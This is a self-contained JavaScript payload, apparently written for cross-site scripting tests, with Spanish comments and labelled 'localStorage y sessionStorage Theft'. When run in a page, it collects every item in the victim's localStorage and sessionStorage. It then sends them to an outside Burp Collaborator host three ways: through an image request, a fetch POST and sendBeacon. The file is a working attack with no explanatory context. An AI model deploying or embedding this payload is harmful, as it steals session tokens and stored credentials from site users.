(function(){
  var burp="http://w630bbm6tppekzwbv9aovobqlhr8f03p.oastify.com/";
  
  var stolen={
    timestamp:new Date().toISOString(),
    attack:"localStorage y sessionStorage Theft",
    localStorage_data:{},
    sessionStorage_data:{},
    localStorage_size:0,
    sessionStorage_size:0
  };
  
  // Capturar localStorage
  for(var key in localStorage){
    if(localStorage.hasOwnProperty(key)){
      stolen.localStorage_data[key]=localStorage.getItem(key);
    }
  }
  stolen.localStorage_size=JSON.stringify(stolen.localStorage_data).length;
  
  // Capturar sessionStorage
  for(var key in sessionStorage){
    if(sessionStorage.hasOwnProperty(key)){
      stolen.sessionStorage_data[key]=sessionStorage.getItem(key);
    }
  }
  stolen.sessionStorage_size=JSON.stringify(stolen.sessionStorage_data).length;
  
  // Enviar a Burp
  new Image().src=burp+'?data='+btoa(JSON.stringify(stolen));
  fetch(burp,{method:'POST',mode:'no-cors',body:JSON.stringify(stolen)}).catch(function(){});
  navigator.sendBeacon(burp,JSON.stringify(stolen));
})();
